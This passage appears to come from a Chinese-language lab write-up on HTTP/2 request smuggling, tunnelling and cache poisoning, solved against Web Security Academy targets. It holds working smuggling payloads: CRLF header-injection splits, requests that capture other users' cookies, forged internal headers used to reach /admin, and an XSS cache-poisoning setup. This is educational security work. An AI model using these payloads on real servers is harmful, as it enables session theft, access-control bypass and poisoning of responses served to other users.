+
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118135214453.png" alt="image-20221118135214453"></p>
+<p>接下来走私一个完整的请求。为了区分捕获的请求是其他用户的还是自己的，这里设置一个不存在的路径，让后端返回404。记住在请求末尾有<code>\r\n\r\n</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0aa200d404cce7c3c09e037a00440013.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /yake-daigua HTTP/1.1</span><br><span class="line">Host: 0aa200d404cce7c3c09e037a00440013.web-security-academy.net</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>捕获自己的请求做区分：</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118135744201.png" alt="image-20221118135744201"></p>
+<p>捕获用户的请求：</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118144251729.png" alt="image-20221118144251729"></p>
+<p>我们捕获到admin用户302跳转，窃取到他的cookie。发两次包，可以看到成功进入admin后台。直接删除carlos用户就行了。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118144347248.png" alt="image-20221118144347248"></p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118144552299.png" alt="image-20221118144552299"></p>
+<h1 id="CRLF拆分"><a href="#CRLF拆分" class="headerlink" title="CRLF拆分"></a>CRLF拆分</h1><p>即使网站验证<code>Content-Length</code>的值或者过滤了<code>Transfer-Encoding</code>请求头，如果没有对<code>\n</code>进行处理，那么能进行请求走私。</p>
+<p>在HTTP1中，有时可以利用换行符<code>\n</code>来走私被过滤的请求头。如果后端将它视为分隔符。但是前端不这样做，那么前端服务器无法检测请求头内容中包含的请求头。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Foo: bar\nTransfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
+
+<p>在HTTP2中，由于请求是二进制传输，所有请求头的结束是非常明确的。那么<code>\r\n</code>就不具有特殊的意义，所以在请求头的值当中也不会被拆分开来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Foo: bar\r\nTransfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
+
+<p>但是依旧会产生问题，在HTTP2降级的时候，<code>\r\n</code>被HTTP1重新解释为一个请求头的结束，传到后端时，会被认定是两个请求头。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Foo: bar</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
+
+<p>我们利用这一点就有效的绕过了<code>Transfer-Encoding</code>的过滤。</p>
+<h3 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h3><p>实验目的：利用CRLF绕过<code>Transfer-Encoding</code>的过滤，通过search来捕获用户请求。HTTP1中已有类似的实验，不再赘述。</p>
+<p>首先把burp的<code>Inspector</code>展开，在<code>Request Headers</code>中可以修改键值。如果直接在<code>Repeater</code>中修改，是不会成功的。我们修改成功后去试一下，是否有404响应。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118155435800.png" alt="image-20221118155435800"></p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118155515059.png" alt="image-20221118155515059"></p>
+<p>连续发送两次后，观察到有404响应了。这时候可以开始实施我们的攻击。我们通过主页面搜索框抓包发现POST的正文为<code>search=</code>，那么可以把下一个用户的请求拼接进来，响应的回显就能看到他的请求，便可以窃取<code>Cookie</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a8700ab0412c0eac07b0dfa00a1003f.web-security-academy.net</span><br><span class="line">Cookie: session=TgTtM26tcOnCqyqDlRZSA8KuBSm3hUJe; _lab_analytics=KADnpo89eIUNanbS3wlpsvFYS5exsLjRYYjs1PCPh96sfgkFlGscFrzHaCU7encqWbTdHNAOw3uMehjUiCYf5Lps3HNtPiavnLJnIZ8Rnxu4e8pjdW92UCfzvFOPqR6QVgSw0r2JoCS987IW6K9mbOBwSlAVXkMh9ZHwp3zzZMOlcOJ2o06RbPJFcdDHxtDwVkL6Mpe93JBCnYycFSpgqRqubpgCM0QhP4eglMrE8ik5VOeWRBHoJ3Gn4UwkIVdi</span><br><span class="line">Content-Length: 800                     //为了能让用户的请求尽可能都被捕获</span><br><span class="line"></span><br><span class="line">search=yake-daigua</span><br></pre></td></tr></table></figure>
+
+<p>这里迟迟等不到靶场的用户进来，索性捕捉自己的了。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118161528222.png" alt="image-20221118161528222"></p>
+<blockquote>
+<p>在修补时，只修补<code>\r\n</code>而不修补<code>\n</code>是一个致命的错误。</p>
+</blockquote>
+<h1 id="HTTP2请求拆分"><a href="#HTTP2请求拆分" class="headerlink" title="HTTP2请求拆分"></a>HTTP2请求拆分</h1><h3 id="请求头内容拆分"><a href="#请求头内容拆分" class="headerlink" title="请求头内容拆分"></a>请求头内容拆分</h3><p>虽然CRLF拆分能够绕过一部分过滤，但是能不能找到更好的方法呢？如果我们利用<code>\r\n\r\n</code>，而不是<code>\r\n</code>，我们就可以直接结束第一个请求。这种方法可以不需要后端支持<code>Transfer-Encoding</code>，请求正文和POST方法。但是，有一个必要因素是前端必须以<code>\r\n\r\n</code>去结束一个请求头，（绝大多数场景都是适用的）使得它变成一个独立完整的请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:method	GET</span><br><span class="line">:path	/</span><br><span class="line">:authority	vulnerable-website.com</span><br><span class="line">foo	</span><br><span class="line">	bar\r\n</span><br><span class="line">	\r\n</span><br><span class="line">	GET /admin HTTP/1.1\r\n</span><br><span class="line">	Host: vulnerable-website.com</span><br></pre></td></tr></table></figure>
+
+<p>要在请求头中拆分请求，需要了解前端服务器如何重写请求，并在手动添加任何 HTTP&#x2F;1 标头时考虑到这一点。否则，其中一个请求可能缺少强制的请求头。</p>
+<p>例如，需要确保后端收到的两个请求都包含一个<code>Host</code>标头。前端服务器通常会在降级期间过滤<code>:authority</code>这个伪请求头并用新的 HTTP&#x2F;1 标头替换它。<code>Host</code>执行此操作有不同的方法，这会影响我们要注入的请求头<code>Host</code>，我们要重新考虑它放置的位置。</p>
+<p>假设我们有以下请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:method	GET</span><br><span class="line">:path	/</span><br><span class="line">:authority	vulnerable-website.com</span><br><span class="line">foo	</span><br><span class="line">	bar\r\n</span><br><span class="line">	\r\n</span><br><span class="line">	GET /admin HTTP/1.1\r\n</span><br><span class="line">	Host: vulnerable-website.com</span><br></pre></td></tr></table></figure>
+
+<p>在HTTP2降级的重写期间，一些前端服务器将新<code>Host</code>标头附加到当前标头列表的末尾。对于HTTP&#x2F;2 前端而言，它在<code>foo</code>标头之后。这也是在请求将在后端拆分之后。这意味着第一个请求根本没有<code>Host</code>标头，而走私的请求会有两个。在这种情况下，我们就需要调整注入的<code>Host</code>请求头在<code>foo</code>的后面，在<code>GET</code>的前面，以便在发生拆分后它能够在第二个GET请求中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:method	GET</span><br><span class="line">:path	/</span><br><span class="line">:authority	vulnerable-website.com</span><br><span class="line">foo	</span><br><span class="line">	bar\r\n</span><br><span class="line">	Host: vulnerable-website.com\r\n</span><br><span class="line">	\r\n</span><br><span class="line">	GET /admin HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>既然能在请求头内容上进行拆分，那是不是在请求头上和请求首行也能进行拆分？答案是肯定的。下面给出案例。</p>
+<h3 id="H2-TE请求头拆分"><a href="#H2-TE请求头拆分" class="headerlink" title="H2.TE请求头拆分"></a>H2.TE请求头拆分</h3><table>
+<thead>
+<tr>
+<th>:method</th>
+<th>POST</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>:path</td>
+<td>&#x2F;</td>
+</tr>
+<tr>
+<td>:authority</td>
+<td>ecosystem.atlassian.net</td>
+</tr>
+<tr>
+<td>foo: bar<br/>transfer-encoding</td>
+<td>chunked</td>
+</tr>
+</tbody></table>
+<h3 id="H2-TE请求首行拆分"><a href="#H2-TE请求首行拆分" class="headerlink" title="H2.TE请求首行拆分"></a>H2.TE请求首行拆分</h3><table>
+<thead>
+<tr>
+<th>:method</th>
+<th>GET &#x2F; HTTP&#x2F;1.1<br/>Transfer-encoding: chunked<br/>x: x</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>:path</td>
+<td>ignored</td>
+</tr>
+<tr>
+<td>:authority</td>
+<td>ecosystem.atlassian.net</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">transfer-encoding: chunked</span><br><span class="line">x: x /ignored HTTP/1.1</span><br><span class="line">Host: eco.atlassian.net</span><br></pre></td></tr></table></figure>
+
+<h3 id="案例-3"><a href="#案例-3" class="headerlink" title="案例"></a>案例</h3><p>实验目的：利用请求内容拆分，进行响应队列投毒，窃取admin用户cookie，删除用户carlos。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bar\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /daigua HTTP/1.1\r\n</span><br><span class="line">Host: 0a4e007c0339196bc194274200b2008d.web-security-academy.net</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118165503514.png" alt="image-20221118165503514"></p>
+<p>收到404响应说明投毒成功，接下来常规捕获302跳转就行了。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118165708621.png" alt="image-20221118165708621"></p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118165914272.png" alt="image-20221118165914272"></p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221118170004168.png" alt="image-20221118170004168"></p>
+<p>和前面的案例一样。</p>
+<h1 id="HTTP请求隧道"><a href="#HTTP请求隧道" class="headerlink" title="HTTP请求隧道"></a>HTTP请求隧道</h1><p>至此，我们介绍的请求走私攻击都有一个前提：前端服务器与后端服务器之间的相同连接用于处理多个请求。下面就讲讲即使不重用连接的攻击手段。</p>
+<p>当服务器只允许来自同一IP或同一客户端的请求重用连接，其他人根本不会重用连接。这时就没有明显的办法去影响其他用户的流量。尽管攻击面被缩小了，但仍然能做出一些危险的行为。以下介绍泄露请求头和web缓存投毒。但是再次之前，先讲讲如何确认请求非同步隧道的存在。</p>
+<h3 id="隧道确认"><a href="#隧道确认" class="headerlink" title="隧道确认"></a>隧道确认</h3><blockquote>
+<p>HTTP&#x2F;1 和 HTTP&#x2F;2 都可以使用请求隧道，但在仅 HTTP&#x2F;1 的环境中检测起来要困难得多。由于持久 ( <code>keep-alive</code>) 连接在 HTTP&#x2F;1 中的工作方式，即使您确实收到两个响应，也不一定确认请求已成功走私。</p>
+<p>另一方面，在 HTTP&#x2F;2 中，每个“流”应该只包含一个请求和响应。如果您收到一个 HTTP&#x2F;2 响应，正文中似乎是一个 HTTP&#x2F;1 响应，您可以确信您已经成功地通过隧道传输了第二个请求。</p>
+</blockquote>
+<p>所以我们只需要进行一个最简单的请求（假设后端为TE），就能分辨。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure>
+
+<p>在响应中，能够看见响应正文包含HTTP1的响应。说明是非同步的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Content-Length: 162</span><br><span class="line">Location: /en</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;301 Moved…</span><br><span class="line"></span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Content-Length: 162…</span><br></pre></td></tr></table></figure>
+
+<p>但是真实环境下上述方法并没有那么有效。前端服务器通常使用后端响应中的 <code>Content-Length</code> 来决定从套接字读取多少字节。<strong>这意味着即使你可以向后端发送两个请求并从中触发两个响应，前端也只会向传递第一个不太符合预期的响应</strong>。（暂且将这种情况称为<strong>盲请求隧道</strong>）</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /images/tiny.png HTTP/1.1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">…</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">content</span><br><span class="line"></span><br><span class="line">HTTP/1.1 403              //此行及后续并不会返回给用户</span><br><span class="line">…</span><br></pre></td></tr></table></figure>
+
+<p>明明只需要一些信息就能够进行判别，后端所返回的响应过于冗余。可以通过改变请求的方法来解决这一点。这里采用HEAD方法做示例，OPTIONS也可以。</p>
+<p>利用前面讲过的请求拆分。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:method	HEAD</span><br><span class="line">:path	/example</span><br><span class="line">:authority	vulnerable-website.com</span><br><span class="line">foo	</span><br><span class="line">	bar\r\n</span><br><span class="line">	\r\n</span><br><span class="line">	GET /tunnelled HTTP/1.1\r\n</span><br><span class="line">	Host: vulnerable-website.com\r\n</span><br><span class="line">	X: x</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">:status	200</span><br><span class="line">content-type	text/html</span><br><span class="line">content-length	131</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 4286</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;h1&gt;Tunnelled&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is a tunnelled respo</span><br></pre></td></tr></table></figure>
+
+<p>所以如果你怀疑存在盲请求隧道，那可以利用HEAD等方法测试时间延迟性。</p>
+<p><em><strong>如果向其发送<code>HEAD</code>请求的端点返回的资源比尝试读取的隧道响应长度短，则它可能会在我们看到一整个完整的请求内容之前被截断</strong></em>，就像上面给的示例一样。另一方面，如果返回<code>content-length</code>比我们隧道请求的响应还要长，<em><strong>可能会遇到超时，因为前端服务器需要等待从后端发来的剩余字节</strong></em>。</p>
+<p>不过这都可以被解决：</p>
+<ol>
+<li>使用HEAD指向不同的端点。</li>
+<li>如果返回的资源太短（HEAD），可以在HEAD请求头内容中（bar）利用增添字符。虽然响应中是看不到我们输入的字符，但是返回的<code>content-length</code>仍然会把它计算入内。</li>
+<li>如果返回的资源太长（HEAD），我们可以在走私的请求中（x）增添字符。这样隧道响应的长度就能与之匹配或大于它。</li>
+</ol>
+<p>下面再贴一个burp插件的扫描示例。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HEAD / HTTP/1.1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">H A X</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="请求头泄露"><a href="#请求头泄露" class="headerlink" title="请求头泄露"></a>请求头泄露</h3><blockquote>
+<p>不存在于 Param Miner 的静态词列表中或在站点流量中泄漏的自定义内部标头可能会逃避检测。常规请求走私可用于使服务器将其内部标头泄露给攻击者，但这种方法不适用于请求隧道。</p>
+</blockquote>
+<blockquote>
+<p>幸运的是，如果您可以通过 HTTP&#x2F;2 在标头中注入换行符，则还有另一种发现内部标头的方法。经典的不同步攻击依赖于让两个服务器对请求主体的结束位置产生分歧，但是使用换行符我们可以相反地导致对请求主体的开始位置产生分歧！</p>
+</blockquote>
+<p>为了获取 bitbucket 使用的内部标头，发出了以下请求（一个搜索框的POST）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">:method	POST</span><br><span class="line">:path	/blog</span><br><span class="line">:authority	bitbucket.org</span><br><span class="line">foo	</span><br><span class="line">	bar</span><br><span class="line">	Host: bitbucket.wpengine.com</span><br><span class="line">	Content-Length: 200</span><br><span class="line">	</span><br><span class="line">	s=cow</span><br><span class="line">	</span><br><span class="line">foo=bar</span><br></pre></td></tr></table></figure>
+
+<p>降级之后，它的形式为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /blog HTTP/1.1</span><br><span class="line">Foo: bar</span><br><span class="line">Host: bitbucket.wpengine.com</span><br><span class="line">Content-Length: 200</span><br><span class="line"></span><br><span class="line">s=cow</span><br><span class="line">SSLClientCipher: TLS_AES_128</span><br><span class="line">Host: bitbucket.wpengine.com</span><br><span class="line">Content-length: 7</span><br><span class="line"></span><br><span class="line">foo=bar</span><br></pre></td></tr></table></figure>
+
+<p>前端和后端都认为只发送了一个请求，但是不知道请求正文是从哪里开始的。前端认为’s&#x3D;cow’ 是请求头的一部分，所以内部的请求头会添加在cow的后面，但是到达后端的时候。发出的响应就是内部请求头也作为一个搜索内容进行搜索。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;You searched for cowSSLClientCipher: TLS_AES_128_GCM_SHA256, version=TLSv1.3, bits=128Host: bitbucket.wpengine.comSSLSessionID: X-Cluster-Client-IP: 81.132.48.250Connection: Keep-Alivecontent-length: 7</span><br></pre></td></tr></table></figure>
+
+<h3 id="案例-4"><a href="#案例-4" class="headerlink" title="案例"></a>案例</h3><p>实验目的：前端服务器不重用后端的连接，且没有充分清理传入的请求头名称。利用请求隧道攻击，以admin身份删除用户carlos。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119210942474.png" alt="image-20221119210942474"></p>
+<p>POST包，观察错误响应表明服务器处理了您注入的主机，确认该实验室容易受到通过标头名称进行 CRLF 注入的攻击。</p>
+<p>寻找主页面搜索框，抓包发现对于POST数据为<code>search=</code>，利用请求头拆分进行走私。为了能捕获尽可能多的请求头，先把<code>Content-Length</code>的值设置的大一点。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119211359084.png" alt="image-20221119211359084"></p>
+<p>和上面的结论一样，<code>Content-Length</code>过大超时了。这里可以在search后面添加任意字符串或者修改<code>Content-Length</code>的值进行精确捕获。我这里就直接改<code>Content-Length</code>。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119211654787.png" alt="image-20221119211654787"></p>
+<p>可以看到我们捕获了三个内部请求头：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 search results for &#x27;x: yake-daigua</span><br><span class="line">X-SSL-VERIFIED: 0</span><br><span class="line">X-SSL-CLIENT-CN: null</span><br><span class="line">X-FRONTEND-KEY: 4509999423768002</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<p><code>X-FRONTEND-KEY</code>是唯一标识，因为请求隧道的原因，我们又不能捕获其他用户的请求头。</p>
+<p>我们观察一下前俩：</p>
+<p><code>X-SSL-VERIFIED: 0</code><br><code>X-SSL-CLIENT-CN: null</code></p>
+<p>我们修改试一试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-SSL-VERIFIED: 1</span><br><span class="line">X-SSL-CLIENT-CN: administrator</span><br><span class="line">X-FRONTEND-KEY: 4509999423768002</span><br></pre></td></tr></table></figure>
+
+<p>把我们的请求头改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foo: bar\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /admin HTTP/1.1\r\n</span><br><span class="line">X-SSL-VERIFIED: 1\r\n</span><br><span class="line">X-SSL-CLIENT-CN: administrator\r\n</span><br><span class="line">X-FRONTEND-KEY: 4509999423768002\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line">yake-daigua</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119212626328.png" alt="image-20221119212626328"></p>
+<p>没有成功？？？想一想原因，后端传来不太符合预期的响应，试试HEAD。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119213149443.png" alt="image-20221119213149443"></p>
+<p>还是没有成功，再想一想，前面说过利用HEAD测试请求隧道的三种解决方法。我们这里伪造的请求不需要<code>Content-Length</code>，那么我们采取第一种方法，试试访问别的路径<code>/login</code>（反正<code>/my-account</code>也会被重定向到<code>/login</code>）。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119213518555.png" alt="image-20221119213518555"></p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119213618558.png" alt="image-20221119213618558"></p>
+<p>重复之前案例的操作就行了。</p>
+<h3 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h3><p>缓存投毒在<code>HTTP/1.1</code>中想必各位师傅早就比较熟悉了。这边就不再详细介绍了。</p>
+<blockquote>
+<p>尽管请求隧道通常比经典请求走私更受限制，但有时您仍然可以构建高严重性攻击。例如，您可能能够结合我们目前已经研究过的请求隧道技术，以获得一种非常强大的 Web 缓存投毒形式。</p>
+<p>使用非盲请求隧道，您可以有效地将一个响应的标头与另一个响应的主体混合和匹配。如果正文中的响应反映了未编码的用户输入，您可以在浏览器通常不会执行代码的上下文中 利用此行为来反射XSS 。</p>
+</blockquote>
+<p>例如，以下响应包含未编码的、攻击者可控的输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123; &quot;name&quot; : &quot;test&lt;script&gt;alert(1)&lt;/script&gt;&quot; &#125;</span><br><span class="line">[etc.]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>就其本身而言，这是相对无害的。这<code>Content-Type</code>意味着此有效负载将被浏览器简单地解释为 JSON。但是请考虑一下，如果您改为将请求隧道化到后端，会发生什么情况。此响应将出现在不同响应的主体内，有效地继承其标头，包括<code>content-type</code>.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:status	200</span><br><span class="line">content-type	text/html</span><br><span class="line">content-length	174</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123; &quot;name&quot; : &quot;test&lt;script&gt;alert(1)&lt;/script&gt;&quot; &#125;</span><br><span class="line">[etc.]</span><br></pre></td></tr></table></figure>
+
+<p>由于缓存发生在前端，缓存也可以被欺骗为其他用户提供这些混合响应。</p>
+<h3 id="案例-5"><a href="#案例-5" class="headerlink" title="案例"></a>案例</h3><p>实验目的：缓存投毒，使得访问主页的受害者用户，浏览器会执行<code>alert(1)</code>。</p>
+<p>先GET请求走私一下<code>:path</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cachebuster=1 HTTP/1.1\r\n</span><br><span class="line">Foo: bar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221119220659751.png" alt="image-20221119220659751"></p>
+<p>观察响应，正常，说明可以在<code>:path</code>进行请求走私。</p>
+<p>改变请求方法为HAED，试一下进行隧道传输。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?cachebuster=2 HTTP/1.1</span><br><span class="line">Host: 0ad000e504d316fac03031f100c000a3.web-security-academy.net</span><br><span class="line"></span><br><span class="line">GET /post?postId=5 HTTP/1.1</span><br><span class="line">Foo: bar</span><br></pre></td></tr></table></figure>
+
